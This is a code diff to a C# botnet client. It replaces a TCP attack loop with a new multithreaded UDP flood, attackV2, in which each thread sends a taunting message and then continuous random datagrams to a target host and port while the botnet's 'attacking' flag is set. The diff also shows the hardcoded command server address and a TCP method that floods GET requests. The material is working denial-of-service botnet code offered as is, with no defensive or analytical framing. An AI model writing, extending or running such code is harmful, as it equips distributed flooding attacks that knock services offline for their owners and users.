@@ -22,6 +22,7 @@ namespace BotnetClient
         Socket socket;
         // Client thread
         Thread clientThread;
+        List<AttackConnection> attackConnections = new List<AttackConnection>();
         // Host Server Settings
         //string serverIPV4 = "192.168.1.44"; // IPV4 of host server (for lan)
         string serverIPV4 = "10.35.24.225"; // IPV4 of host server (for lan)
@@ -177,8 +178,17 @@ namespace BotnetClient
                                                     log("Starting attack...");
                                                     for (int i = 0; SockCount > i; i++)
                                                     {
-                                                        // Create sockets for attack
-                                                        try { InitClient(new TcpClient()); } catch { }
+                                                        try
+                                                        {
+                                                            AttackConnection newConnection = new AttackConnection();
+                                                            log("Creating attack thread [" + newConnection.guid + "]");
+                                                            newConnection.attackThread = new Thread(() => attackV2(newConnection));
+                                                            newConnection.attackThread.Start();
+                                                        } catch (Exception e)
+                                                        {
+                                                            log("Error creating attack thread " + e.ToString());
+                                                        }
+                                                        //try { InitClient(new TcpClient()); } catch { } // DISABLED FOR TESTING/CREATING V2
                                                     }
                                                 }
                                             }
@@ -314,11 +324,56 @@ namespace BotnetClient
 
 
 
+        /// <summary>
+        /// UDP attack method
+        /// </summary>
+        /// <param name="connection"></param>
+        private void attackV2(AttackConnection connection)
+        {
+            // Create and setup socket for this attack thread
+            Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
+            IPAddress serverAddr = IPAddress.Parse(HostOrIP.Trim());
+            IPEndPoint endPoint = new IPEndPoint(serverAddr, Port);
+            connection.attackSocket = sock;
 
+            // Send first message
+            try
+            {
+                string text = "Get shmacked slime!";
+                byte[] send_buffer = Encoding.ASCII.GetBytes(text);
+                sock.SendTo(send_buffer, endPoint);
+            } catch (Exception e)
+            {
+                log("Initial attack message not sent on thread " + connection.guid + "...");
+            }
 
+            Boolean shouldAttack = attacking;
+            while (shouldAttack)
+            {
+                shouldAttack = attacking;
+                try
+                {
+                    string text = Guid.NewGuid().ToString();
+                    byte[] send_buffer = Encoding.ASCII.GetBytes(text);
+                    log("[" + connection.guid + "] sending data: " + text);
+                    sock.SendTo(send_buffer, endPoint);
+                } catch (Exception e)
+                {
+                    log("Problem sending attack message on thread " + connection.guid + ". Closing thread...");
+                    connection.attackSocket.Shutdown(SocketShutdown.Both);
+                    connection.attackSocket.Close();
+                    connection.attackSocket.Dispose();
+                    shouldAttack = false;
+                }
+                Thread.Sleep(Delay);
+            }
+            log("Attack thread " + connection.guid + " has finished running...");
+        }
 
-
-        // Attack Method (this need work/tweaking/overhaul)
+        /// <summary>
+        /// TCP attack method
+        /// </summary>
+        /// <param name="c"></param>
         public void InitClient(TcpClient c)
         { 
             // GET request to random nonexistent location
